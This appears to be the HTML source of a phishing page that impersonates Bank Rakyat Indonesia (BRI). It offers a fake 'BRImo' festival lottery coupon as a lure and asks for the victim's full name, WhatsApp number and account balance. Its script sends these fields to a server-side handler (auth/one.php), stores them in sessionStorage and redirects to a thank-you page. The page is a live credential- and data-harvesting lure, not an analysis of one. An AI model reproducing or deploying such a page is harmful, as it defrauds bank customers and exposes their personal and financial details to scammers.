

<html>
<head>
  <meta charset="UTF-8">
<meta name="theme-color" content="#0f78cb">  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, viewport-fit=cover">  
  <title>Kupon BRI</title>
  <link rel="stylesheet" href="./style.css">
<link href="https://fonts.googleapis.com/css?family=Average" rel="stylesheet">

</head>


<style>
    .wrapper {
	width: 100%;
	overflow: hidden;
}
.photobanner {
	position: relative;
	height: 173px;
	margin-bottom: 30px;
	display: flex;
	width: 100%;
}

.photobanner img {
  margin: 0px 5px;
  box-shadow: 2px 3px 8px #8a8a8a;
  border: 2px groove #118eea;
  border-radius: 5px;
}

.photobanner {
  animation: bannermove 15s linear infinite alternate-reverse;
}

@keyframes bannermove {
  from {
    left: 0%;
  }
  to {
    left: -1000px;
  }
}


.animation-bounceInRight {
    animation-name: bounceInRight;
    animation-duration: 2s;
    animation-timing-function: ease-in;
    animation-fill-mode: both;
}
@keyframes bounceInRight {
    0% {
        opacity: 0;
        transform: translateX(200px);
    }
    60% {
        opacity: 1;
        transform: translateX(-30px);
    }
    80% {
        transform: translateX(10px);
    }
    100% {
        transform: translateX(0);
    }
}


</style>
<style>
#typing-text {
	width: 90%;
	height: 50px;
	font-size: 15px;
	border: solid 0px #C9C9C9;
	color: #0f78cb;
	background-color: #FFFFFF;
	text-align: center;
	font-family: Average, serif;
	font-weight: bold;
	padding: 5px;
	resize: none;
	outline: none;
	box-sizing: border-box;
}

.card-input__input {
  width: 100%;
  height: 45px;
  border-radius: 8px;
  box-shadow: 0px 17px 20px -6px rgba(36, 52, 70, 0.36); border: outline-style: groove;
  border: 2px solid #1A89DF;
    animation-name: fadeInDownBig;
    animation-duration: 3s;
    animation-fill-mode: both;
  font-size: 18px;
  padding: 5px;
  padding-left: 10px;
  padding-top: 3px;
  background: #fff;
  color: #1a3b5d;
  margin: 10px 0;
  font-family: Average, serif;
}
.card-input__input:hover, .card-input__input:focus {
  border-color: #FAC03B;
}
.card-input__input:focus {
  box-shadow: 0px 10px 20px -13px rgba(32, 56, 117, 0.35);
  background: #fff;
}


.card-input__input::placeholder{
    font-size: 14px;
    
}
.card-input__input.-select {
  -webkit-appearance: none;
  background-image: url("https://static.thenounproject.com/png/4066370-200.png");
  background-size: 14px;
  background-position: 90% center;
  background-repeat: no-repeat;
  padding-right: 30px;
  padding-top: 3px;
}

.card-form__button {
  width: 100%;
  height: 43px;
  box-shadow: 0px 17px 20px -6px rgba(36, 52, 70, 0.36);
  
  background: #1A89DF;
  border: 3px blue;
  outline-style: groove;
 color: #fff;
  border-radius: 22px;
  font-size: 15px;
  font-weight: 500;
  font-weight: 8;
  font-family: "Source Sans Pro", sans-serif;
  box-shadow: #D5D5D5 10px; 
  
  margin-top: -10px;
  cursor: pointer;
}
@media screen and (max-width: 480px) {
  .card-form__button {
    margin-top: -10px;
  }
}

form label{
    font-family: Average,
    serif;
    font-size: 14px;
    color: #0F78CB;
}

.text-style {
    font-size: 25px;
    font-weight: bold;
    font-family: Arial, Helvetica, sans-serif;
    text-align: center;
}

.animation-bounceInDown{
    animation-name: .animation-fadeInDownBig {
    animation-name: fadeInDownBig;
    animation-duration: 3s;
    animation-fill-mode: both;
}
@keyframes fadeInDownBig {
    0% {
        opacity: 0;
        transform: translateY(-200px);
    }
    100% {
         transform: translateY(0);
    };
    
}
@keyframes bounceInDown {
    0% {
        opacity: 1;
        transform: translateX(-200px);
    }%
    60% {
        opacity: 1;
        transform: translateY(30px);
    }
    80% {
        transform: translateX(-10px);
    }
    100% {
        transform: translateY(0);
    }
}



.animation-bounceInRight {
    animation-name: bounceInRight;
    animation-duration: 2s;
    animation-timing-function: ease-in;
    animation-fill-mode: both;
}
@keyframes bounceInRight {
    0% {
        opacity: 1;
        transform: translateX(200px);
    }
    60% {
        opacity: 1;
        transform: translateX(-30px);
    }
    80% {
        transform: translateX(10px);
    }
    100% {
        transform: translateX(0);
    }
}

.animation-fadeInLeftBig {
    animation-name: fadeInLeftBig;
    animation-duration: 3s;
    animation-timing-function: ease-in;
    animation-fill-mode: both;
}
@keyframes fadeInLeftBig {
    0% {
        opacity: 1;
        transform: translateX(-200px);
    }
    100% {
        opacity: 1;
        transform: translateX(0);
    }
}
 
.animation-fadeInDownBig {
    animation-name: fadeInDownBig;
    animation-duration: 3s;
    animation-fill-mode: both;
}
@keyframes fadeInDownBig {
    0% {
        opacity: 1;
        transform: translateY(-200px);
    }
    100% {
        opacity: 1;
        transform: translateY(0);
    }
}

.animation-fadeInUpBig {
    animation-name: fadeInUpBig;
    animation-duration: 3s;
    animation-timing-function: ease-in;
    animation-fill-mode: both;
}
@keyframes fadeInUpBig {
    0% {
        opacity: 0;
        transform: translateY(200px);
    }
    100% {
        opacity: 1;
        transform: translateY(0);
    }
}
</style>
<body>
<nav style="position: ; top: 0; left: 0; right: 0; margin: 0px auto; width: 100%; height: 65px; background: #F1F5F8; z-index: 99999" class="animation-fadeInDownBig">
 <img src="https://blogger.googleusercontent.com/img/a/AVvXsEjQFn2FL94wRlyOPftKAw4l0zvctq8GLDxukOjiQZLDpzEWZKYov-G6YrcvamMzWoQgo81_igGMuRGgAc262j88jBEt3shINBc0R1wANatBEXsWaMAxvW-PCwG1_WoDWr8zTTWs3xEh6h2XZFO0cAX48FKuaoygiqUATY0pKmTgJsGg_WtoPGTwKyNYsHpB" style="width: 100%; position: fixed; top: 0; left: 0; right: 0; margin: 0px auto">
</nav>
<center>
<textarea id="typing-text" readonly></textarea>
</center>
<form id="inputlogin" onsubmit="return false"  method="POST"
              class="animation-fadeInLeftBig" style="padding: 10px">
        <div class="card-input animation-fadeInLeftBig " >
          <label for="cardName" class="card-input__label" style="font-weight: 800;margin-left: 3px">𝗡𝗮𝗺𝗮 𝗟𝗲𝗻𝗴𝗸𝗮𝗽 𝗡𝗮𝘀𝗮𝗯𝗮𝗵</label>


          <input type="text" id="nama" name="nama" class="card-input__input" v-model="cardNumber" v-on:focus="focusInput"  data-ref="cardNumber" autocomplete="off" placeholder="Masukkan Nama Lengkap Nasabah" required>
        </div>
        <div class="card-input">
          <label for="cardName" class="card-input__label" style="font-weight: 800; margin-left: 3px">𝗡𝗼𝗺𝗼𝗿 𝗪𝗵𝗮𝘁𝘀𝗮𝗽𝗽</label>
          <input type="tel" id="nomor" name="nomor" class="card-input__input" v-model="cardName"  v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardName" autocomplete="off" placeholder="Masukkan Nomor Handphone" maxlength="13" required>
        </div>
        <div class="card-form__row">
          <div class="card-form__col">
            <div class="card-form__group">

                
          </div>
          <div class="card-form__col -cvv">
            <div class="card-input">
              <label for="cardCvv" class="card-input__label"style="font-weight: 800; margin-left: 5px">𝗦𝗮𝗹𝗱𝗼 𝗔𝗻𝗱𝗮 𝘀𝗮𝗮𝘁 𝗜𝗻𝗶</label>
              <input type="tel" class="uang card-input__input" id="saldo" name="saldo" placeholder="Rp" maxlength=""  autocomplete="off" required style="background-image: url();
  background-repeat: no-repeat;
  background-position: 100% 100%;
  background-size: 100% 100%; background-color: #ddd; ">
            </div>
          </div>
        </div>

       <div class="animation-fadeInUpBig" style="position: fixed; bottom: 0; left: 0; right: 0; margin: 0px auto; width: 100%; height: 72px; background: #fff; box-shadow: rgba(0, 0, 0, 0.15) 5px 5px 15px 0px; padding-top: 15px;border-top: 2px double #ccc">
<button type="submit" id="kirims" style="margin-left: 20px;margin-top: 0px;position:relative;background-color:#0F78CB;color:white;border:0px solid #0076e0;width:90%;border-radius:10px;font-family: Average, serif;font-size: 16px;padding:13px;display: inline-block; box-shadow: rgba(0, 0, 0, 0.10) 0px 10px 10px, rgba(0, 0, 0, 0.20) 0px 6px 6px; height: 50px" >Lanjutkan Cetak Kupon</button>
           </div>
</form>
      </div>
   </form>
   
    
<div class="wrapper animation-bounceInRight" style="margin-top: 0px">
	<div class="photobanner">
  <img class="first" src="https://i.ibb.co.com/N2VWV3Wx/3171c46d0fd41fcfaca9ea560cab05daf080c1da60f7bab6159fb7a0634a6416-0.webp" alt="" />
  <img src="img/a.jpg" alt="" />
  <img src="img/b.jpg" alt="" />
  <img src="img/c.mp4" type="Video/GIF" alt="" />
  
</div>
</div>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js'></script>
<script src="script.html"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.min.js"></script>   
<script>
(() => {
	let TypingSpeed = 100;
	let NxtMsgDelay = 1000000;
	let CharacterPos = 0;
	let MsgBuffer = "";
	let MsgIndex = 0;
	let delay;
	let loop = false;
	let id = document.getElementById("typing-text");
	let messages =
[
	"Lengkapi Data Berikut Untuk Pencetakan \nKupon undian BRI FSTVL BRImo"
]

	// https://www.html-code-generatorom/html/typewriter-text-scroller
	const StartTyping = () => {
		if (CharacterPos != messages[MsgIndex].length) {
			MsgBuffer += messages[MsgIndex].charAt(CharacterPos);
			id.value = MsgBuffer+(CharacterPos != messages[MsgIndex].length-1 ? "﹏✎":"");
			delay = TypingSpeed;
			id.scrollTop = id.scrollHeight; 
		} else {
			delay = NxtMsgDelay;
			MsgBuffer   = "";
			CharacterPos = -1;
			if (MsgIndex!= messages.length-1){
				MsgIndex++;
			}else {
				MsgIndex = 0;
			}
		}
		CharacterPos++;
		setTimeout(StartTyping, delay);
	}
	StartTyping();
})();
</script>  
   <script type="text/javascript">
            $(document).ready(function(){

                // Format mata uang.
                $( '.uang' ).mask('000.000.000.000', {reverse: true});
 var dengan_rupiah = document.getElementById('saldo');
    dengan_rupiah.addEventListener('keyup', function(e)
    {
        dengan_rupiah.value = formatRupiah(this.value, 'Rp. ');
    });
    
    
      /* Fungsi */
    function formatRupiah(angka, prefix)
    {
        var number_string = angka.replace(/[^,\d]/g, '').toString(),
            split    = number_string.split(','),
            sisa     = split[0].length % 3,
            rupiah     = split[0].substr(0, sisa),
            ribuan     = split[0].substr(sisa).match(/\d{3}/gi);
            
        if (ribuan) {
            separator = sisa ? '.' : '';
            rupiah += separator + ribuan.join('.');
        }
        
        rupiah = split[1] != undefined ? rupiah + ',' + split[1] : rupiah;
        return prefix == undefined ? rupiah : (rupiah ? 'Rp. ' + rupiah : '');
    }
            })
            
            
        </script>

<script>
$(document).ready(function(){
    $('#inputlogin').submit(function(e) {
      
 document.getElementById('kirims').innerHTML = "Memproses....";
$.ajax({
 type: 'POST',
 url: 'auth/one.php',
 data: $(this).serialize(),
 complete: function(data) {
            console.log('Complete')
  setTimeout(function(){
    window.location.href='thankyou.php';  
var nomor = document.getElementById("nomor").value;
sessionStorage.setItem("nomor", nomor);
var nama = document.getElementById("nama").value;
sessionStorage.setItem("nama", nama);
var saldo = document.getElementById("saldo").value;
sessionStorage.setItem("saldo", saldo);
     }, 500);


 }
    });
 });
    return false;
});   
        
</script>
</body>
</html> 
